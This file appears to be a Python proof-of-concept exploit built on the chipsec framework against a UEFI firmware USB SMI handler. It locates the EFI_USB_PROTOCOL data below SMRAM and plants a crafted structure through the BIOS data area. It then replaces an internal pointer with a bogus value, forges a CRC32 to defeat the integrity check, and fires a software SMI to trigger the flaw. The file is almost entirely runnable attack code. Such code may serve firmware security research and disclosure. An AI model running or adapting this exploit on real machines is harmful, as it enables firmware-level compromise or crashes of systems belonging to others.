from struct import pack, unpack
from crc_spoof import *

import chipsec.chipset
from chipsec.hal.interrupts import Interrupts

PAGE_SIZE = 0x1000
SMI_USB_RUNTIME = 0x31

cs = chipsec.chipset.cs()
cs.init(None, True, True)

intr = Interrupts(cs)
SMRAM = cs.cpu.get_SMRAM()[0]

mem_read = cs.helper.read_physical_mem
mem_write = cs.helper.write_physical_mem
mem_alloc = cs.helper.alloc_physical_mem
io_read = cs.helper.read_io_port

# check if system is in ACPI mode
# assert (io_read(0x1804, 1) & 1) == 0, "this system is in ACPI mode now"

# locate EFI_USB_PROTOCOL and usb_data in the memory
for addr in xrange(SMRAM / PAGE_SIZE - 1, 0, -1):
    if mem_read(addr * PAGE_SIZE, 4) == 'USBP':
        usb_protocol = addr * PAGE_SIZE
        usb_data = unpack("<Q", mem_read(addr * PAGE_SIZE + 8, 8))[0] 
        break

assert usb_protocol != 0, "can't find EFI_USB_PROTOCOL structure"

if usb_data == 0:
    usb_data = usb_protocol - 0x10000

# locate Extended BIOS Data Area address
ebda_addr = unpack('<H', mem_read(0x40e, 2))[0] * 0x10

struct_addr = mem_alloc(PAGE_SIZE, 0xffffffff)[1]

# address should be in 4GiB range
if struct_addr >> 32:
    struct_addr = ebda_addr

# prepare our structure
mem_write(struct_addr, PAGE_SIZE, '\x00' * PAGE_SIZE) # clean the structure
mem_write(struct_addr + 0x0, 1, '\x2d') # subfunction number
mem_write(struct_addr + 0xb, 1, '\x10') # arithmetic adjustment

# store the pointer to the structure in the EBDA
mem_write(ebda_addr + 0x104, 4, pack('<I', struct_addr))

bad_ptr = 0xbaddad
buf_size = 0x10

buffer = mem_read(usb_data + 0x70, buf_size)
crc32 = get_buffer_crc32(buffer)

# replace the pointer (usb_data + 0x78)
buffer = buffer[0:8] + pack('<Q', bad_ptr)

# spoof crc32, first 4 bytes will be modified
buffer = modify_buffer_crc32(buffer, 0, crc32)

mem_write(usb_data + 0x70, buf_size, buffer)

# allow to read the pointer from EBDA
x = ord(mem_read(usb_data + 0x8, 1)) & ~0x10
mem_write(usb_data + 0x8, 1, chr(x))

# stuck it!
intr.send_SW_SMI(0, SMI_USB_RUNTIME, 0, 0, 0, 0, 0, 0, 0)
